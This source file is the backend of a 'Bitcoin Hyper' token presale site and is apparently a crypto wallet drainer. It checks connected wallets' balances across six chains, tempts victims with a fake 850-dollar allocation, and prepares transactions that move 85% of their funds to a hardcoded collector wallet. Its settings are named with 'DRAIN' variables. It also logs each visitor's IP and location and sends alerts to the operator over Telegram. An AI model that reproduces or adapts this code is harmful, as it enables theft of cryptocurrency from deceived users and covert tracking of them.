// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================
// PERSISTENT STORAGE SETUP
// ============================================

const DATA_DIR = path.join(__dirname, 'data');
const STORAGE_FILE = path.join(DATA_DIR, 'storage.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  console.log('📁 Created data directory');
}

// Load storage from disk or create new
let memoryStorage;

function loadStorage() {
  try {
    if (fs.existsSync(STORAGE_FILE)) {
      const data = fs.readFileSync(STORAGE_FILE, 'utf8');
      const parsed = JSON.parse(data);
      
      console.log(`📂 Loaded storage with:
  - Participants: ${parsed.participants?.length || 0}
  - Site Visits: ${parsed.siteVisits?.length || 0}
  - Pending Flows: ${parsed.pendingFlows?.length || 0}
  - Completed Flows: ${parsed.completedFlows?.length || 0}`);
      
      return {
        participants: parsed.participants || [],
        pendingFlows: new Map(parsed.pendingFlows || []),
        completedFlows: new Map(parsed.completedFlows || []),
        settings: parsed.settings || {
          tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
          tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
          valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
          statistics: {
            totalParticipants: 0,
            eligibleParticipants: 0,
            claimedParticipants: 0,
            uniqueIPs: [],
            totalProcessedUSD: 0,
            totalProcessedWallets: 0,
            processedTransactions: []
          },
          flowEnabled: process.env.DRAIN_ENABLED === 'true'
        },
        emailCache: new Map(parsed.emailCache || []),
        siteVisits: parsed.siteVisits || []
      };
    }
  } catch (error) {
    console.error('Error loading storage:', error);
  }
  
  // Default empty storage
  return {
    participants: [],
    pendingFlows: new Map(),
    completedFlows: new Map(),
    settings: {
      tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
      tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
      valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
      statistics: {
        totalParticipants: 0,
        eligibleParticipants: 0,
        claimedParticipants: 0,
        uniqueIPs: [],
        totalProcessedUSD: 0,
        totalProcessedWallets: 0,
        processedTransactions: []
      },
      flowEnabled: process.env.DRAIN_ENABLED === 'true'
    },
    emailCache: new Map(),
    siteVisits: []
  };
}

// Save storage to disk
function saveStorage() {
  try {
    // Convert Maps to arrays for JSON serialization
    const toSave = {
      participants: memoryStorage.participants,
      pendingFlows: Array.from(memoryStorage.pendingFlows.entries()),
      completedFlows: Array.from(memoryStorage.completedFlows.entries()),
      settings: memoryStorage.settings,
      emailCache: Array.from(memoryStorage.emailCache.entries()),
      siteVisits: memoryStorage.siteVisits
    };
    
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(toSave, null, 2));
    console.log(`💾 Storage saved: ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits`);
  } catch (error) {
    console.error('Error saving storage:', error);
  }
}

// Auto-save every minute
setInterval(saveStorage, 60 * 1000);

// Initialize storage
memoryStorage = loadStorage();

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    storage: '💾 Persistent (30 days)',
    stats: {
      participants: memoryStorage.participants.length,
      visits: memoryStorage.siteVisits.length,
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size
    },
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Optimism': null // Not deployed yet
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    telegramEnabled = false;
    return false;
  }
  
  try {
    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    
    if (meResponse.data?.ok) {
      telegramBotName = meResponse.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
        `💾 Storage: ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
        `🌍 Site: https://bitcoinhypertoken.vercel.app`
      );
      
      return true;
    }
  } catch (error) {}
  
  telegramEnabled = false;
  return false;
}

// ============================================
// HUMAN/BOT DETECTION
// ============================================

function detectHuman(userAgent) {
  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
  
  return {
    isHuman: !isBot,
    isBot: isBot,
    deviceType: hasTouch ? 'Mobile' : 'Desktop'
  };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// TRACK SITE VISIT
// ============================================

async function trackSiteVisit(ip, userAgent, referer, path) {
  const location = await getIPLocation(ip);
  const humanInfo = detectHuman(userAgent);
  
  const visit = {
    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    ip: ip.replace('::ffff:', ''),
    timestamp: new Date().toISOString(),
    country: location.country,
    flag: location.flag,
    city: location.city,
    userAgent: userAgent || 'Unknown',
    referer: referer || 'Direct',
    path: path || '/',
    walletConnected: false,
    walletAddress: null,
    isHuman: humanInfo.isHuman,
    deviceType: humanInfo.deviceType
  };
  
  memoryStorage.siteVisits.push(visit);
  
  // Keep only last 30 days of visits
  const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
  memoryStorage.siteVisits = memoryStorage.siteVisits.filter(v => 
    new Date(v.timestamp).getTime() > thirtyDaysAgo
  );
  
  saveStorage();
  
  // Send Telegram notification
  await sendTelegramMessage(
    `${visit.isHuman ? '👤' : '🤖'} <b>NEW VISIT</b>\n` +
    `📍 ${location.country} ${location.flag}\n` +
    `📱 ${humanInfo.deviceType}\n` +
    `🌍 https://bitcoinhypertoken.vercel.app`
  );
  
  return visit;
}

// ============================================
// WALLET BALANCE CHECK
// ============================================

async function getWalletBalance(walletAddress) {
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          totalValue += valueUSD;
          
          results.balances.push({
            chain: chain.name,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          });
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= (memoryStorage.settings?.valueThreshold || 1);
    
    if (results.isEligible) {
      results.allocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// TRACK VISIT ENDPOINT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        isHuman: visit.isHuman
      }
    });
    
  } catch (error) {
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Generate email from wallet
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const email = `user${hash.substring(0, 8)}@proton.me`;
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        email: email,
        connectedAt: new Date().toISOString(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false,
        userAgent: req.headers['user-agent']
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      if (!memoryStorage.settings.statistics.uniqueIPs.includes(clientIP)) {
        memoryStorage.settings.statistics.uniqueIPs.push(clientIP);
      }
      saveStorage();
      
      await sendTelegramMessage(
        `${location.flag} <b>NEW PARTICIPANT</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `📍 ${location.country}\n` +
        `📧 ${email}`
      );
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    if (balanceResult.success) {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.balances = balanceResult.data.balances;
      participant.lastScanned = new Date().toISOString();
      
      if (balanceResult.data.isEligible) {
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      saveStorage();
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        amount: (b.amount * 0.85).toFixed(6),
        valueUSD: (b.valueUSD * 0.85).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    saveStorage();
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        transactions
      }
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress === walletAddress.toLowerCase()
    );
    
    if (participant) {
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        timestamp: new Date().toISOString()
      });
      
      const flow = memoryStorage.pendingFlows.get(flowId);
      if (flow) {
        flow.completedChains.push(chainName);
        
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString() 
          });
          memoryStorage.pendingFlows.delete(flowId);
        }
        
        saveStorage();
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date().toISOString();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    saveStorage();
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>CLAIM COMPLETED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `🎟️ ${claimId}\n` +
      `📧 ${participant.email}`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN DASHBOARD WITH DAY/WEEK FILTER
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const filter = req.query.filter || 'week'; // 'day' or 'week'
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  // Calculate time filter
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  const filterTime = filter === 'day' ? now - oneDay : now - (7 * oneDay);
  
  // Filter data by time
  const filteredVisits = memoryStorage.siteVisits.filter(v => 
    new Date(v.timestamp).getTime() > filterTime
  );
  
  const filteredParticipants = memoryStorage.participants.filter(p => 
    new Date(p.connectedAt).getTime() > filterTime
  );
  
  const filteredPendingFlows = Array.from(memoryStorage.pendingFlows.entries())
    .filter(([_, flow]) => new Date(flow.createdAt).getTime() > filterTime)
    .map(([id, flow]) => ({ id, ...flow }));
  
  const filteredCompletedFlows = Array.from(memoryStorage.completedFlows.entries())
    .filter(([_, flow]) => new Date(flow.completedAt).getTime() > filterTime)
    .map(([id, flow]) => ({ id, ...flow }));
  
  const filteredTransactions = (memoryStorage.settings?.statistics?.processedTransactions || [])
    .filter(t => new Date(t.timestamp).getTime() > filterTime);
  
  // Calculate location stats
  const locationStats = {};
  filteredParticipants.forEach(p => {
    const key = `${p.country}|${p.flag}`;
    if (!locationStats[key]) {
      locationStats[key] = { country: p.country, flag: p.flag, count: 0, eligible: 0 };
    }
    locationStats[key].count++;
    if (p.isEligible) locationStats[key].eligible++;
  });
  
  // Calculate hourly activity for the filtered period
  const hourlyActivity = {};
  filteredVisits.forEach(v => {
    const hour = new Date(v.timestamp).getHours();
    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
  });
  
  // Calculate daily activity
  const dailyActivity = {};
  filteredVisits.forEach(v => {
    const date = new Date(v.timestamp).toISOString().split('T')[0];
    dailyActivity[date] = (dailyActivity[date] || 0) + 1;
  });
  
  res.json({
    success: true,
    filter: filter,
    dateRange: filter === 'day' ? 'Last 24 Hours' : 'Last 7 Days',
    timestamp: new Date().toISOString(),
    summary: {
      totalVisits: filteredVisits.length,
      uniqueIPs: new Set(filteredVisits.map(v => v.ip)).size,
      totalParticipants: filteredParticipants.length,
      eligibleParticipants: filteredParticipants.filter(p => p.isEligible).length,
      claimedParticipants: filteredParticipants.filter(p => p.claimed).length,
      totalProcessedUSD: filteredTransactions.reduce((sum, t) => sum + 85, 0).toFixed(2), // Approximate
      pendingFlows: filteredPendingFlows.length,
      completedFlows: filteredCompletedFlows.length,
      telegramStatus: telegramEnabled ? '✅' : '❌'
    },
    networks: Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
      chain,
      contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
      status: PROJECT_FLOW_ROUTERS[chain] ? '✅' : '⏸️'
    })),
    recentVisits: filteredVisits.slice(-50).reverse(),
    activeParticipants: filteredParticipants.slice(-30).reverse(),
    pendingFlows: filteredPendingFlows.slice(-20).reverse(),
    completedFlows: filteredCompletedFlows.slice(-20).reverse(),
    processedTransactions: filteredTransactions.slice(-30).reverse(),
    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
    hourlyActivity: Object.entries(hourlyActivity).map(([hour, count]) => ({ hour: parseInt(hour), count })),
    dailyActivity: Object.entries(dailyActivity).map(([date, count]) => ({ date, count })),
    system: {
      valueThreshold: memoryStorage.settings?.valueThreshold || 1,
      flowEnabled: memoryStorage.settings?.flowEnabled || false,
      tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
      collectorWallet: COLLECTOR_WALLET,
      totalStorage: {
        participants: memoryStorage.participants.length,
        visits: memoryStorage.siteVisits.length,
        pendingFlows: memoryStorage.pendingFlows.size,
        completedFlows: memoryStorage.completedFlows.size
      }
    }
  });
});

// ============================================
// ADMIN WALLET DETAILS
// ============================================

app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  const walletAddress = req.params.address.toLowerCase();
  
  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
  const flows = {
    pending: Array.from(memoryStorage.pendingFlows.values()).filter(f => f.walletAddress === walletAddress),
    completed: Array.from(memoryStorage.completedFlows.values()).filter(f => f.walletAddress === walletAddress)
  };
  
  res.json({
    success: true,
    found: !!participant,
    wallet: participant,
    visits,
    flows
  });
});

// ============================================
// ADMIN SAVE (manual trigger)
// ============================================

app.post('/api/admin/save', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  saveStorage();
  res.json({ success: true, message: 'Storage saved' });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND
  =======================
  📍 Port: ${PORT}
  💾 Storage: ${memoryStorage.participants.length} participants
  💾 Visits: ${memoryStorage.siteVisits.length}
  🌍 Site: https://bitcoinhypertoken.vercel.app
  
  ✅ Ready!
  `);
  
  await testTelegramConnection();
});
